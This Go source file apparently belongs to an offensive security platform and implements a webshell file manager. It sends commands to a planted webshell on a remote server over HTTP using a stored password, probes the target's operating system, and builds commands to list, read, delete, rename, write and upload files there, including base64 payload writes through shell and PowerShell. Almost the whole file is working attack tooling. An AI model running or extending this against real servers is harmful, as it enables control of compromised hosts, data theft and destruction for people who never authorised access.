package server

import (
	"bytes"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/url"
	"strings"
)

// wsFileCommandInput 与 findu buildFileCommand 的输入对齐。
type wsFileCommandInput struct {
	Action     string
	Path       string
	TargetPath string
	Content    string
	ChunkIndex int
	OS         string
	ShellType  string
}

// wsResolveOS 根据 os 与 shellType 推断最终目标 OS（仅返回 linux/windows）。
func wsResolveOS(osTag, shellType string) string {
	osTag = strings.ToLower(strings.TrimSpace(osTag))
	switch osTag {
	case "linux":
		return "linux"
	case "windows":
		return "windows"
	}
	if t := strings.ToLower(strings.TrimSpace(shellType)); t == "asp" || t == "aspx" {
		return "windows"
	}
	return "linux"
}

func wsQuoteCmdPath(p string) string {
	if p == "" {
		return "\".\""
	}
	return "\"" + strings.ReplaceAll(p, "\"", "\"\"") + "\""
}

func wsNormalizeWinPath(p string) string {
	s := strings.TrimSpace(p)
	if s == "" {
		return s
	}
	return strings.ReplaceAll(s, "/", "\\")
}

func wsQuotePsSingle(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "''") + "'"
}

func wsQuotePosix(p string) string {
	if p == "" {
		return "."
	}
	return "'" + strings.ReplaceAll(p, "'", "'\\''") + "'"
}

func wsPowerShellWrite(path, b64 string) string {
	script := "$b=[Convert]::FromBase64String(" + wsQuotePsSingle(b64) + ");" +
		"[IO.File]::WriteAllBytes(" + wsQuotePsSingle(path) + ",$b)"
	return "powershell -NoProfile -NonInteractive -Command \"" + script + "\""
}

func wsPowerShellAppend(path, b64 string) string {
	script := "$b=[Convert]::FromBase64String(" + wsQuotePsSingle(b64) + ");" +
		"$f=[IO.File]::Open(" + wsQuotePsSingle(path) + ",[IO.FileMode]::Append,[IO.FileAccess]::Write,[IO.FileShare]::None);" +
		"try{$f.Write($b,0,$b.Length)}finally{$f.Close()}"
	return "powershell -NoProfile -NonInteractive -Command \"" + script + "\""
}

func wsBuildFileCommand(in wsFileCommandInput) (string, error) {
	targetOS := wsResolveOS(in.OS, in.ShellType)
	action := strings.ToLower(strings.TrimSpace(in.Action))
	path := strings.TrimSpace(in.Path)
	switch action {
	case "list":
		p := path
		if p == "" {
			p = "."
		}
		if targetOS == "windows" {
			p = wsNormalizeWinPath(p)
			return "dir /a " + wsQuoteCmdPath(p), nil
		}
		return "ls -la " + wsQuotePosix(p), nil
	case "read":
		if path == "" {
			return "", errors.New("path is required")
		}
		if targetOS == "windows" {
			return "type " + wsQuoteCmdPath(wsNormalizeWinPath(path)), nil
		}
		return "cat " + wsQuotePosix(path), nil
	case "delete":
		if path == "" {
			return "", errors.New("path is required")
		}
		if targetOS == "windows" {
			return "del /q /f " + wsQuoteCmdPath(wsNormalizeWinPath(path)), nil
		}
		return "rm -f " + wsQuotePosix(path), nil
	case "mkdir":
		if path == "" {
			return "", errors.New("path is required")
		}
		if targetOS == "windows" {
			return "md " + wsQuoteCmdPath(wsNormalizeWinPath(path)), nil
		}
		return "mkdir -p " + wsQuotePosix(path), nil
	case "rename":
		oldPath, newPath := path, strings.TrimSpace(in.TargetPath)
		if oldPath == "" || newPath == "" {
			return "", errors.New("path and target_path are required for rename")
		}
		if targetOS == "windows" {
			return "move /y " + wsQuoteCmdPath(wsNormalizeWinPath(oldPath)) + " " + wsQuoteCmdPath(wsNormalizeWinPath(newPath)), nil
		}
		return "mv -f " + wsQuotePosix(oldPath) + " " + wsQuotePosix(newPath), nil
	case "write":
		if path == "" {
			return "", errors.New("path is required")
		}
		b64 := base64.StdEncoding.EncodeToString([]byte(in.Content))
		if targetOS == "windows" {
			return wsPowerShellWrite(wsNormalizeWinPath(path), b64), nil
		}
		return "echo '" + b64 + "' | base64 -d > " + wsQuotePosix(path), nil
	case "upload":
		if path == "" {
			return "", errors.New("path is required")
		}
		if len(in.Content) > 512*1024 {
			return "", errors.New("upload content too large (max 512KB base64)")
		}
		if targetOS == "windows" {
			return wsPowerShellWrite(wsNormalizeWinPath(path), in.Content), nil
		}
		return "echo '" + in.Content + "' | base64 -d > " + wsQuotePosix(path), nil
	case "upload_chunk":
		if path == "" {
			return "", errors.New("path is required")
		}
		if targetOS == "windows" {
			if in.ChunkIndex == 0 {
				return wsPowerShellWrite(wsNormalizeWinPath(path), in.Content), nil
			}
			return wsPowerShellAppend(wsNormalizeWinPath(path), in.Content), nil
		}
		redir := ">>"
		if in.ChunkIndex == 0 {
			redir = ">"
		}
		return "echo '" + in.Content + "' | base64 -d " + redir + " " + wsQuotePosix(path), nil
	}
	return "", errors.New("unsupported action: " + action)
}

// wsOSProbeCommand 探活命令：利用 Windows cmd 与 POSIX shell 对 %OS% 展开差异判定。
const wsOSProbeCommand = "echo :OSPROBE_%OS%:END"

func wsClassifyOSProbeOutput(out string) string {
	if out == "" {
		return ""
	}
	if strings.Contains(out, "Windows_NT") {
		return "windows"
	}
	if strings.Contains(strings.ToLower(out), "microsoft windows") {
		return "windows"
	}
	if strings.Contains(out, "%OS%") {
		return "linux"
	}
	return ""
}

// wsProbeOSViaExec 通过一次命令执行回显推断 OS。
func wsProbeOSViaExec(execFn func(cmd string) (string, bool)) string {
	if execFn == nil {
		return ""
	}
	out, ok := execFn(wsOSProbeCommand)
	if !ok {
		return ""
	}
	return wsClassifyOSProbeOutput(out)
}

// wsFileOpRequest 与 findu FileOpRequest 对齐的宿主请求体。
type wsFileOpRequest struct {
	URL          string `json:"url"`
	Password     string `json:"password"`
	Type         string `json:"type"`
	Method       string `json:"method"`
	CmdParam     string `json:"cmd_param"`
	Encoding     string `json:"encoding"`
	OS           string `json:"os"`
	ConnectionID string `json:"connection_id"`
	Action       string `json:"action"`
	Path         string `json:"path"`
	TargetPath   string `json:"target_path"`
	Content      string `json:"content"`
	ChunkIndex   int    `json:"chunk_index"`
}

// wsFileOpResponse 与 findu FileOpResponse 对齐。
type wsFileOpResponse struct {
	OK         bool   `json:"ok"`
	Output     string `json:"output"`
	Error      string `json:"error,omitempty"`
	DetectedOS string `json:"detected_os,omitempty"`
}

// wsExecCommandHTTP 执行单条命令并取回显（供 OS 探测复用）。
func wsExecCommandHTTP(conn wsFileOpRequest, command string) (string, bool) {
	useGET := strings.ToUpper(strings.TrimSpace(conn.Method)) == "GET"
	cmdParam := strings.TrimSpace(conn.CmdParam)
	if cmdParam == "" {
		cmdParam = "cmd"
	}
	var err error
	var httpReq *http.Request
	if useGET {
		targetURL := webshellBuildExecURL(conn.URL, conn.Type, conn.Password, cmdParam, command)
		httpReq, err = http.NewRequest(http.MethodGet, targetURL, nil)
	} else {
		body := webshellBuildExecBody(conn.Type, conn.Password, cmdParam, command)
		httpReq, err = http.NewRequest(http.MethodPost, conn.URL, bytes.NewReader(body))
		httpReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	if err != nil {
		return "", false
	}
	httpReq.Header.Set("User-Agent", "Mozilla/5.0 (compatible; FindUAI-WebShell/1.0)")
	resp, err := webshellHTTPClient.Do(httpReq)
	if err != nil {
		return "", false
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", false
	}
	out, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", false
	}
	return decodeWebshellOutput(out, conn.Encoding), true
}

// fileOpWebshellNative serves POST /api/webshell/file：
// findu WebShellHandler.FileOp 的宿主原生实现（文件操作，无 findu 运行态依赖）。
func (s *Server) fileOpWebshellNative(w http.ResponseWriter, r *http.Request) {
	var req wsFileOpRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeErr(w, http.StatusBadRequest, err.Error())
		return
	}
	req.URL = strings.TrimSpace(req.URL)
	req.Action = strings.ToLower(strings.TrimSpace(req.Action))
	if req.URL == "" || req.Action == "" {
		writeErr(w, http.StatusBadRequest, "url and action are required")
		return
	}
	// 已保存连接：DB 凭据为准。
	if cid := strings.TrimSpace(req.ConnectionID); cid != "" {
		ws := s.webshellsNative()
		if ws == nil {
			writeErr(w, http.StatusServiceUnavailable, "database unavailable")
			return
		}
		conn, err := ws.Get(cid)
		if err != nil {
			if errors.Is(err, sql.ErrNoRows) {
				writeErr(w, http.StatusNotFound, "connection not found")
				return
			}
			writeErr(w, http.StatusInternalServerError, err.Error())
			return
		}
		if conn == nil {
			writeErr(w, http.StatusNotFound, "connection not found")
			return
		}
		req.URL, req.Password, req.Type = conn.URL, conn.Password, conn.Type
		req.Method, req.CmdParam, req.Encoding, req.OS = conn.Method, conn.CmdParam, conn.Encoding, conn.OS
	}

	parsed, err := url.Parse(req.URL)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") {
		writeErr(w, http.StatusBadRequest, "invalid url: only http(s) allowed")
		return
	}

	// OS 未显式配置时先探活识别真实 OS，再构造文件操作命令。
	osTag := req.OS
	detectedOS := ""
	if strings.ToLower(strings.TrimSpace(osTag)) == "auto" || strings.TrimSpace(osTag) == "" {
		probe := func(cmd string) (string, bool) {
			p := req
			p.Type = strings.TrimSpace(req.Type)
			if p.Type == "" {
				p.Type = "php"
			}
			return wsExecCommandHTTP(p, cmd)
		}
		if probed := wsProbeOSViaExec(probe); probed != "" {
			osTag, detectedOS = probed, probed
			if cid := strings.TrimSpace(req.ConnectionID); cid != "" {
				if ws := s.webshellsNative(); ws != nil {
					if conn, e := ws.Get(cid); e == nil && conn != nil {
						conn.OS = probed
						_ = ws.Update(conn)
					}
				}
			}
		}
	}

	command, cmdErr := wsBuildFileCommand(wsFileCommandInput{
		Action:     req.Action,
		Path:       req.Path,
		TargetPath: req.TargetPath,
		Content:    req.Content,
		ChunkIndex: req.ChunkIndex,
		OS:         osTag,
		ShellType:  req.Type,
	})
	if cmdErr != nil {
		writeJSON(w, http.StatusBadRequest, wsFileOpResponse{OK: false, Error: cmdErr.Error()})
		return
	}

	out, ok := wsExecCommandHTTP(req, command)
	if !ok {
		writeJSON(w, http.StatusOK, wsFileOpResponse{OK: false, Error: "webshell exec failed"})
		return
	}
	writeJSON(w, http.StatusOK, wsFileOpResponse{OK: true, Output: out, DetectedOS: detectedOS})
}